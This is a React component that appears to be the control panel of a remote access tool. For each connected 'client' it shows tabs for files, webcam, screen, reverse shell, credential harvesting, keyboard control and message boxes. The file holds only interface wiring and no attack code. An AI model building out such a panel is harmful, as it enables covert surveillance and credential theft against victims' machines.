import React, {useEffect, useState} from 'react';
import {useDispatch} from 'react-redux';
import {Paper, Tabs, Tab as MuiTab, IconButton} from '@mui/material';
import FileManager from "../Funcionalities/FileManager/FileManager";
import WebcamManager from "@components/Funcionalities/WebcamManager/WebcamManager";
import {ArrowBack, Toc} from "@mui/icons-material";
import ScreenManager from "@components/Funcionalities/ScreenManager/ScreenManager";
import ReverseShell from "@components/Funcionalities/ReverseShell/ReverseShell";
import CredentialsManager from "@components/Funcionalities/CredentialsManager/CredentialsManager";
import KeyboardController from "@components/Funcionalities/KeyboardController/KeyboardController";
import MessageBox from "@components/Funcionalities/MessageBox/MessageBox";
import SystemManager from "@components/Funcionalities/SystemManager/SystemManager";


function ClientManager({client, onBack}) {
    const dispatch = useDispatch();

    const [currentTab, setCurrentTab] = useState(0);

    useEffect(() => {
        setCurrentTab(0);
    }, [client]);

    const handleChange = (event, newValue) => {
        setCurrentTab(newValue);
    };

    return (
        <Paper sx={{height: "100%", overflow:'hidden', mb:1}} elevation={10}>
            <IconButton onClick={onBack} sx={{mt: 1, ml: 1}}>
                <ArrowBack/>
            </IconButton>
            <Tabs value={currentTab} onChange={handleChange}>
                <MuiTab label="Information"/>
                <MuiTab label="File manager"/>
                <MuiTab label="Webcam manager"/>
                <MuiTab label="Screen manager"/>
                <MuiTab label="Reverse shell"/>
                <MuiTab label="Credentials manager"/>
                <MuiTab label="Keyboard controller"/>
                <MuiTab label="Message box"/>

            </Tabs>

            {currentTab === 0 && <SystemManager/>}
            {currentTab === 1 && <FileManager/>}
            {currentTab === 2 && <WebcamManager/>}
            {currentTab === 3 && <ScreenManager/>}
            {currentTab === 4 && <ReverseShell/>}
            {currentTab === 5 && <CredentialsManager/>}
            {currentTab === 6 && <KeyboardController/>}
            {currentTab === 7 && <MessageBox/>}
        </Paper>
    );
}

export default ClientManager;
